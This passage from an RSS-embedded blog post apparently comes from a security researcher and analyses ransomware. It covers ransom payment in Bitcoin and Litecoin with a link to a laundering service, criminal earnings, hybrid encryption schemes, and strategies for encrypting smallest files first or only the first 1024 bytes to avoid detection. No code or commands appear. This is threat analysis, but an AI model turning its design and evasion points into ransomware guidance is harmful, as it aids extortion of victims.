Kits&lt;/a&gt; (mainly malvertisement, watering hole) and Downloaders as well. &lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;&lt;br /&gt;&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;&lt;b&gt;What are the most common payment methods ?&lt;/b&gt;&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;&lt;br /&gt;&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;A key point in Ransomware economy is the &#39;payment method&#39;, the most used and spread one -- which I see nowadays -- is by using the&amp;nbsp; &lt;a href=&#34;http://www.bitcoin.org/&#34;&gt;BitCoin&lt;/a&gt; or &lt;a href=&#34;https://litecoin.org/&#34;&gt;LiteCoin&lt;/a&gt; channls.&amp;nbsp; If associated with a &lt;a href=&#34;https://bitlaunder.com/&#34;&gt;laudry service&lt;/a&gt; could guarantee a reasonable anonymity level.&amp;nbsp; A total different topic is the decision to pay or not to pay the attacker. It is not easy for victims to decide whether or not to pay the ransom demand to get their files back. With data now being essential to many organizations, not paying the demands and losing data could have catastrophic effects, such as closing a business down. On the other hand, paying the ransom demand only encourages even more crypto ransomware campaigns.&amp;nbsp; Some Ransomware such as (but not limited to) CTBLocker offer a &#34;try and buy&#34; capability in order to goad the customer ... hem.. the victm.&amp;nbsp;&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;&lt;br /&gt;&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;&lt;b&gt;How do the ransomware writers earn money ?&lt;/b&gt;&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;&lt;br /&gt;&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;In 2009 a &lt;a href=&#34;http://www.symantec.com/content/en/us/enterprise/media/security_response/whitepapers/ransomware-a-growing-menace.pdf&#34;&gt;Symantec report&lt;/a&gt; found that almost the 3% of victims paid the ransom demand. The report also found that one of the smaller ransomware players managed to infect 68,000 computers in just one month, which could have resulted in victims being defrauded of up to US$400,000 in total.In March 2014, Symantec found that Trojan.Cryptowall earned at least US$34,000 in its first month of operations. A further study of Cryptowall by other information security researchers found that by August 2014, Cryptowall had earned more than US$1.1 million. In June 2015, data from the FBI’s Internet Crime Complaint Center (IC3) showed that between April 2014 and June 2015, it had received 992 Cryptowall-related complaints. The victims were a mix of end users and businesses, and the resulting losses from these cases amounted to more than US$18 million. &lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;&lt;br /&gt;&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;While all ransomware are designed to extort money they can do quite different in both techniques and technologies.&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;&lt;br /&gt;&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;&lt;b&gt;What technique do ransomware use to infect the target system ?&lt;/b&gt;&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;&lt;br /&gt;&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;&lt;b&gt;Encryption as far I observed is the most used technique:&amp;nbsp;&lt;/b&gt;&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;Old ransomware (such as SimpleLocker) have got symmetric key inside the code. They used that key (typically AES256) to encrypt data.This technique makes the malware &#39;orthogonal&#39; by meaning they do not need interaction with external sources to start their job, so they are &#34;ready to encrypt&#34; as soon as they reach the target. On the other hand this technique is weak if a reverse engineer take over it. Once an Cyber Analyst detects the used encryption key he will be able to write the right &#34;decryptor&#34; program freeing the victims without paying the ransom.&amp;nbsp;&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;&lt;br /&gt;&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;Modern ransomware use to dowload a public RSA/DSA key to encrypt the victim&#39;s file. Only the attacker will be able to decrypt the victims files since the used asymmetric encryption technique.&amp;nbsp; On one hand this technique is much more &#34;safe&#34; for the attacker perspective which he does not need to worry about key discovery; but on the other hand it is slower in encryption, if compared to the symetric key technique. Encryption speed is foundamental topic for ransomware writers, since increasing the encryption time means increasing the probability of being detected and stopped.&amp;nbsp;&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;&lt;br /&gt;&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;Current ransomware implements a mixed technology (for example CryptoDefence) in where they use asymmetric keys techniques to exchange symmetric key which will be used to encrypt target data. In this way ransomware need internet connection to communicate through their Command and Control System in order to download keys and to communicate the &#39;end of encryption&#39; once done their job. Both C&amp;amp;C and network communication introduce two more identification factors that might be used agains the ransomware&#39;s writers to detect and block his Malware.&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;&lt;br /&gt;&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;&lt;b&gt;Encryption strategies:&lt;/b&gt;&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;&lt;br /&gt;&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;What to encrypt first is a mandatory question that every ransomware writer should be aware of. Indeed if the ransomware encrypts randomly it might get into big files which will take more resource and time to get encrypted. This will &lt;span class=&#34;short_text&#34; id=&#34;result_box&#34; lang=&#34;en&#34;&gt;&lt;span class=&#34;hps&#34;&gt;surprisingly&lt;/span&gt;&lt;/span&gt; increasing the probability to be identified and to be blocked.&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;&lt;b&gt; &lt;/b&gt;&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;Old ransomware did not care about file size, at that time the ransomware threat was not so spread and they could afford the risk to be identified and blocked.&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;&lt;br /&gt;&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;Most recent ransomware they first order the target folder and start the encryption phase from the smallest file. In this scenario the ransomware increases the probability to encrypt much more files before being identified, which proportionaly increases the probability to get cash from victim!&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;&lt;br /&gt;&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;Recently I observed some variants of TeslaCrypt and TorrentLocker which use to encrypt only the first 1024 Bytes of a file and then move to the next one. This hybrid technique is used in order to increase the probability to encrypt files for what victim will pay for even if on the target machine are found big files (VM, Image file, ISO, etc.).&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;&lt;br /&gt;&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;&lt;br /&gt;&lt;b&gt;How do they communicate to the victim ?&lt;/b&gt;&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;&lt;b&gt;&lt;br /&gt;&lt;/b&gt;&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;Usually ransomware implement 3 different victim communication channls:&lt;/div&gt;&lt;ol style=&#34;text-align: justify;&#34;&gt;&lt;li&gt;&lt;b&gt;Broswer channel&lt;/b&gt;. Ransomware replace your browser home page and/or inject themselves into the broswer process and respond to every internet request their own ransom page.&lt;/li&gt;&lt;li&gt;&lt;b&gt;File channel. &lt;/b&gt;Ransomware write a lot of &#34;README&#34; files which happen to be the only one the victim might read.&lt;/li&gt;&lt;li&gt;&lt;b&gt;Messages Box. &lt;/b&gt;Ransomware writers might decide to communicate to the victime the&amp;nbsp; request by opening up MessageBox directly from OS&#39;syscall.&lt;/li&gt;&lt;/ol&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;&lt;b&gt;How do they communicate to C&amp;amp;C to unlock files once rasom has been payed ?&lt;/b&gt;&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;&lt;br /&gt;&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;There are many different scenarios aobut back communications to the attacker. Some Ransomware does not need to comunicate to thier own command and control at all, the attacker knows about the payment through a covert channel into bitcoin blockchain. On the other hand the communcation might happen through simple HTTP protocol or even through UDP single packets. Again, it is very aleatory, some communication methods are more sophysticated then other, but each one works pretty well and will be not complex to implement.&lt;b&gt;&lt;/b&gt; &lt;a href=&#34;http://cyberintelligence.org/&#34;&gt;CyberIntelligence.org&lt;/a&gt; realised a nice tool to monitor one of the most spread Rasomware &lt;a href=&#34;http://cyberthreatalliance.org/cryptowall-dashboard.html&#34;&gt;Cryptowall&lt;/a&gt;. On the web site you will appreciate the C&amp;amp;C tracker, the spreading URLS and even new samples, but it&#39;s not going to be enough. Rasomware are sold as a service like Tox and many others, it will be super difficult being able to trace all of them.&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;&lt;br /&gt;&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;I do not have conclusions on this specific topic but only a pesonal view of the threat. Ransomware is a mature threat (so many incarnations out there): you can easily find library and kits for built Ransomware on average price of 150 bucks (or even less on Dark Markets) ! Usually once a technology reaches this grade of maturity it became &#34;local&#34;. On my personal point of view we will see the increase of Localized Ransomware threats, starting from languages ending up to targeting specific organizations.&lt;/div&gt;&lt;/div&gt;
</description>
    </item>
    
  </channel>
</rss>
